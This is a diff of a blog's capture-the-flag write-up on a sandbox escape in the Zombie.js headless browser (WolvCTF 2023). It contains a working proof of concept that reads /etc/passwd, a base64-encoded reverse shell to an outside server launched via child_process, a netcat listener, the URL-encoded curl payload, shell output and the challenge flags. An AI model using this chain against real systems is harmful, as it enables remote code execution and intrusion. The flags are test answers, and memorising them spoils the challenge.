@@ -9,7 +9,7 @@
 <meta name="keywords" content="" />
 <meta name="description" content="writeups of wolvCTF.">
 <meta name="author" content="bluesam">
-<link rel="canonical" href="https://bluesam1905.github.io/writeups/wolctfzombie201/" />
+<link rel="canonical" href="https://bluesam1905.github.io/writeups/wolctfzombie301/" />
 <link crossorigin="anonymous" href="/assets/css/stylesheet.min.7bfe087ae72df31787ec7a1360dd05ee246a179b51cf7a30a904b39d7f813b69.css" integrity="sha256-e/4Ieuct8xeH7HoTYN0F7iRqF5tRz3owqQSznX&#43;BO2k=" rel="preload stylesheet" as="style">
 <script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
     onload="hljs.initHighlightingOnLoad();"></script>
@@ -145,11 +145,7 @@
 
         <div class="inner"><ul>
                 <li>
-                    <a href="#zombie-201---web" aria-label="Zombie 201 - Web">Zombie 201 - Web</a></li>
-                <li>
-                    <a href="#start-of-our-research" aria-label="Start of our research">Start of our research</a></li>
-                <li>
-                    <a href="#exploithtml" aria-label="exploit.html">exploit.html</a>
+                    <a href="#wolvctf-2023-zombie-301-401" aria-label="WolvCTF 2023 Zombie 301 401">WolvCTF 2023 Zombie 301 401</a>
                 </li>
             </ul>
         </div>
@@ -157,63 +153,53 @@
 </div>
 
   <div class="post-content">
-  <h1 id="zombie-201---web">Zombie 201 - Web</h1>
-<p>As debug off and httponly on its gonna be hard. maybe?</p>
-<p>##IDEA</p>
+  <h1 id="wolvctf-2023-zombie-301-401">WolvCTF 2023 Zombie 301 401</h1>
+<p>March 20, 2023
+Zombie 301 and 401 - Web</p>
+<p>As debug off and httponly on its gonna be hard. maybe?
+IDEA</p>
 <p>Zombie last version is from 2018, maybe we will find some 0-day (1-day ofc if its the intended way) <a href="https://github.com/assaf/zombie/blob/master/CHANGELOG.md">https://github.com/assaf/zombie/blob/master/CHANGELOG.md</a></p>
 <p>our version on the challenge is the last one, confirmed on package.json:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;name&#34;</span><span class="o">:</span> <span class="s2">&#34;zombie&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;version&#34;</span><span class="o">:</span> <span class="s2">&#34;1.0.0&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;description&#34;</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;main&#34;</span><span class="o">:</span> <span class="s2">&#34;index.js&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;author&#34;</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="s2">&#34;dependencies&#34;</span><span class="o">:</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;escape-html&#34;</span><span class="o">:</span> <span class="s2">&#34;^1.0.3&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;express&#34;</span><span class="o">:</span> <span class="s2">&#34;^4.18.2&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="s2">&#34;zombie&#34;</span><span class="o">:</span> <span class="s2">&#34;^6.1.4&#34;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h1 id="start-of-our-research">Start of our research</h1>
+<p>{
+&ldquo;name&rdquo;: &ldquo;zombie&rdquo;,
+&ldquo;version&rdquo;: &ldquo;1.0.0&rdquo;,
+&ldquo;description&rdquo;: &ldquo;&rdquo;,
+&ldquo;main&rdquo;: &ldquo;index.js&rdquo;,
+&ldquo;author&rdquo;: &ldquo;&rdquo;,
+&ldquo;dependencies&rdquo;: {
+&ldquo;escape-html&rdquo;: &ldquo;^1.0.3&rdquo;,
+&ldquo;express&rdquo;: &ldquo;^4.18.2&rdquo;,
+&ldquo;zombie&rdquo;: &ldquo;^6.1.4&rdquo;
+}
+}</p>
+<p>Start of our research</p>
 <p>On the zombie.js npm page we can find this comment : WARNING: Crawling untrusted web pages with Zombie.js is not safe.</p>
 <p>Given this warning we instantly jump into the github page of zombie and try to search into issues tab for security issues report.</p>
 <p>In an issue we can find a comment wrotten by the creator of the project :</p>
-<pre tabindex="0"><code>Zombie is “full-stack testing using Node.js”. 
+<p>Zombie is “full-stack testing using Node.js”.
 It’s fit for purpose: use it in your test environment, to run test suites, against your application code.
-Zombie is not designed to test adversaries (eg pen tests, web scraping).
-</code></pre><p>In this issue we can find a rejected CVE : <a href="https://github.com/nodejs/security-wg/pull/442">https://github.com/nodejs/security-wg/pull/442</a> So we look what people already found on it.</p>
+Zombie is not designed to test adversaries (eg pen tests, web scraping).</p>
+<p>In this issue we can find a rejected CVE : <a href="https://github.com/nodejs/security-wg/pull/442">https://github.com/nodejs/security-wg/pull/442</a> So we look what people already found on it.</p>
 <p>At this moment we found an interesting comment with a POC of a way to execute arbritrary code.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="sb">`
-</span></span></span><span class="line"><span class="cl"><span class="sb">  (function() {
-</span></span></span><span class="line"><span class="cl"><span class="sb">    var c = &#39;constructor&#39;;
-</span></span></span><span class="line"><span class="cl"><span class="sb">    var require = require=this[c][c](&#39;return process&#39;)().mainModule.require;
-</span></span></span><span class="line"><span class="cl"><span class="sb">    var fs = require(&#39;fs&#39;);
-</span></span></span><span class="line"><span class="cl"><span class="sb">    return String(fs.readFileSync(&#39;/home/joshbreckman/Documents/vm.js&#39;));
-</span></span></span><span class="line"><span class="cl"><span class="sb">  })()
-</span></span></span><span class="line"><span class="cl"><span class="sb">`</span><span class="p">);</span>
-</span></span></code></pre></div><p>console.log(result);</p>
+<p>const vm = require(&lsquo;vm&rsquo;);
+const result = vm.runInNewContext(<code> (function() { var c = 'constructor'; var require = require=this[c][c]('return process')().mainModule.require; var fs = require('fs'); return String(fs.readFileSync('/home/joshbreckman/Documents/vm.js')); })() </code>);</p>
+<p>console.log(result);</p>
 <p>Basicaly this guy tested within the VM module for testing purpose, but from what is said zombie suffer the same issue.</p>
 <p>So lets try this localy with the bot.js file used on the challenge and tweak it to our needs.
 bot.js</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">zombie</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;zombie&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">zombie</span> <span class="p">({</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">waitDuration</span><span class="o">:</span> <span class="mi">5</span><span class="o">*</span><span class="mi">1000</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">localAddress</span><span class="o">:</span> <span class="mi">0</span> <span class="c1">// without this, calls to localhost fail!
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">})</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">httpOnly</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">hostname</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8000/exploit.html&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">=</span> <span class="s2">&#34;Fake{Flag}&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nx">browser</span><span class="p">.</span><span class="nx">setCookie</span><span class="p">({</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="nx">domain</span><span class="o">:</span> <span class="nx">hostname</span><span class="p">,</span> <span class="nx">path</span><span class="o">:</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">value</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">,</span> <span class="nx">httpOnly</span><span class="o">:</span> <span class="nx">httpOnly</span><span class="p">})</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nx">browser</span><span class="p">.</span><span class="nx">visit</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{})</span>  
-</span></span></code></pre></div><h1 id="exploithtml">exploit.html</h1>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<p>const zombie = require(&ldquo;zombie&rdquo;)</p>
+<p>const browser = new zombie ({
+waitDuration: 5*1000,
+localAddress: 0 // without this, calls to localhost fail!
+})</p>
+<p>const httpOnly = &rsquo;true&rsquo;
+const hostname = &ldquo;localhost&rdquo;
+const url = &ldquo;http://localhost:8000/exploit.html&rdquo;</p>
+<p>process.env.FLAG = &ldquo;Fake{Flag}&rdquo;</p>
+<p>browser.setCookie({ name: &lsquo;flag&rsquo;, domain: hostname, path:&rsquo;/&rsquo;, value: process.env.FLAG, httpOnly: httpOnly})</p>
+<p>browser.visit(url, function() {})</p>
+<p>exploit.html</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">aa</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s1">&#39;constructor&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">require</span> <span class="o">=</span> <span class="nx">require</span><span class="o">=</span><span class="k">this</span><span class="p">[</span><span class="nx">c</span><span class="p">][</span><span class="nx">c</span><span class="p">](</span><span class="s1">&#39;return process&#39;</span><span class="p">)().</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">;</span>
@@ -221,55 +207,44 @@ bot.js</p>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">String</span><span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">    <span class="p">})();</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">aa</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
 </span></span></code></pre></div><p>When the script fired we obtain our /etc/passwd file:</p>
 <p>So we have the confirmation that an RCE is possible with Zombie.js 6.1.4.</p>
 <p>Now lets try to catch a reverse shell and flag the challenge.</p>
 <p>Our initial reverse shell :</p>
-<p><code>sh -i &gt;&amp; /dev/tcp/ourserverip/4444 0&gt;&amp;1</code></p>
+<p>sh -i &gt;&amp; /dev/tcp/ourserverip/4444 0&gt;&amp;1</p>
 <p>Base64 encode it:</p>
-<p><code>echo -n 'sh -i &gt;&amp; /dev/tcp/ourserverip/4444 0&gt;&amp;1' | base64 -w 0 c2ggLWkgPiYgL2Rldi90Y3Avb3Vyc2VydmVyaXAvNDQ0NCAwPiYx</code></p>
+<p>echo -n &lsquo;sh -i &gt;&amp; /dev/tcp/ourserverip/4444 0&gt;&amp;1&rsquo; | base64 -w 0
+c2ggLWkgPiYgL2Rldi90Y3Avb3Vyc2VydmVyaXAvNDQ0NCAwPiYx</p>
 <p>and now lets update our exploit.html file.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s1">&#39;constructor&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">require</span> <span class="o">=</span> <span class="nx">require</span><span class="o">=</span><span class="k">this</span><span class="p">[</span><span class="nx">c</span><span class="p">][</span><span class="nx">c</span><span class="p">](</span><span class="s1">&#39;return process&#39;</span><span class="p">)().</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;echo c2ggLWkgPiYgL2Rldi90Y3Avb3Vyc2VydmVyaXAvNDQ0NCAwPiYx | base64 -d | bash&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">})();</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>We try again in local with our bot.js file and booom we received a shell!</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>We try again in local with our bot.js file and booom we received a shell!</p>
 <p>From now we can minify and url encode our payload in exploit.html and make the bot of the challenge visit it.</p>
 <p>Set a listener on listener:</p>
-<p><code>nc -lvp 4444</code></p>
+<p>nc -lvp 4444</p>
 <p>and now fire the payload to the bot</p>
-<pre tabindex="0"><code class="language-curl" data-lang="curl">curl &#39;http://zombie-301-tlejfksioa-ul.a.run.app/visit?url=https://zombie-301-tlejfksioa-ul.a.run.app/zombie?show=%3Cscript%3E%28function%28%29%7Bvar%20c%3D%27constructor%27%3Bvar%20require%3Drequire%3Dthis%5Bc%5D%5Bc%5D%28%27return%20process%27%29%28%29.mainModule.require%3Brequire%28%27child_process%27%29.exec%28%27echo%20c2ggLWkgPiYgL2Rldi90Y3Avb3Vyc2VydmVyaXAvNDQ0NCAwPiYx%20%7C%20base64%20-d%20%7C%20bash%27%29%7D%29%28%29%3B%3C%2Fscript%3E&#39;
-</code></pre><p>and GGs !</p>
-<pre tabindex="0"><code class="language-linux" data-lang="linux">Ncat: Connection from 35.203.246.158:40367.
-sh: 0: can&#39;t access tty; job control turned off
-
-$ id
-uid=1000(node) gid=1000(node) groups=1000(node)
-
-$ pwd
-/ctf/app
-
-$ ls
+<p>curl &lsquo;<a href="http://zombie-301-tlejfksioa-ul.a.run.app/visit?url=https://zombie-301-tlejfksioa-ul.a.run.app/zombie?show=%3Cscript%3E%28function%28%29%7Bvar%20c%3D%27constructor%27%3Bvar%20require%3Drequire%3Dthis%5Bc%5D%5Bc%5D%28%27return%20process%27%29%28%29.mainModule.require%3Brequire%28%27child_process%27%29.exec%28%27echo%20c2ggLWkgPiYgL2Rldi90Y3Avb3Vyc2VydmVyaXAvNDQ0NCAwPiYx%20%7C%20base64%20-d%20%7C%20bash%27%29%7D%29%28%29%3B%3C%2Fscript%3E'">http://zombie-301-tlejfksioa-ul.a.run.app/visit?url=https://zombie-301-tlejfksioa-ul.a.run.app/zombie?show=%3Cscript%3E%28function%28%29%7Bvar%20c%3D%27constructor%27%3Bvar%20require%3Drequire%3Dthis%5Bc%5D%5Bc%5D%28%27return%20process%27%29%28%29.mainModule.require%3Brequire%28%27child_process%27%29.exec%28%27echo%20c2ggLWkgPiYgL2Rldi90Y3Avb3Vyc2VydmVyaXAvNDQ0NCAwPiYx%20%7C%20base64%20-d%20%7C%20bash%27%29%7D%29%28%29%3B%3C%2Fscript%3E'</a></p>
+<p>and GGs !</p>
+<p>Ncat: Connection from 35.203.246.158:40367.
+sh: 0: can&rsquo;t access tty; job control turned off</p>
+<p>$ id
+uid=1000(node) gid=1000(node) groups=1000(node)</p>
+<p>$ pwd
+/ctf/app</p>
+<p>$ ls
 bot.js
 config.json
 index.js
 node_modules
 package-lock.json
 package.json
-public
-
-$ cat config.json
-{&#34;flag&#34;: &#34;wctf{h0w-d1d-y0u-r34d-7h3-3nv-v4r-31831}&#34;, &#34;httpOnly&#34;: true, &#34;allowDebug&#34;: false}
-
-As the browser were vulnerable for all 4 Zombie challenges we can retrieve our two missing flag for Zombie 301 and zombie 401, just repeat same steps for http://zombie-401-tlejfksioa-ul.a.run.app/
-
-Zombie 301 : wctf{h0w-d1d-y0u-r34d-7h3-3nv-v4r-31831} Zombie 401 : wctf{y0u-4r3-4n-4dm1n-807-m4573r-86835}
-</code></pre><p>A big thanks to SamXML for proposing this list of challenge ;)
+public</p>
+<p>$ cat config.json
+{&ldquo;flag&rdquo;: &ldquo;wctf{h0w-d1d-y0u-r34d-7h3-3nv-v4r-31831}&rdquo;, &ldquo;httpOnly&rdquo;: true, &ldquo;allowDebug&rdquo;: false}</p>
+<p>As the browser were vulnerable for all 4 Zombie challenges we can retrieve our two missing flag for Zombie 301 and zombie 401, just repeat same steps for <a href="http://zombie-401-tlejfksioa-ul.a.run.app/">http://zombie-401-tlejfksioa-ul.a.run.app/</a></p>
+<p>Zombie 301 : wctf{h0w-d1d-y0u-r34d-7h3-3nv-v4r-31831} Zombie 401 : wctf{y0u-4r3-4n-4dm1n-807-m4573r-86835}</p>
+<p>A big thanks to SamXML for proposing this list of challenge ;)
 Ressources</p>
 <p><a href="https://www.npmjs.com/package/zombie">https://www.npmjs.com/package/zombie</a> <a href="https://github.com/assaf/zombie">https://github.com/assaf/zombie</a> <a href="https://github.com/nodejs/security-wg/pull/442#issuecomment-442200323">https://github.com/nodejs/security-wg/pull/442#issuecomment-442200323</a> <a href="https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af">https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af</a></p>
 
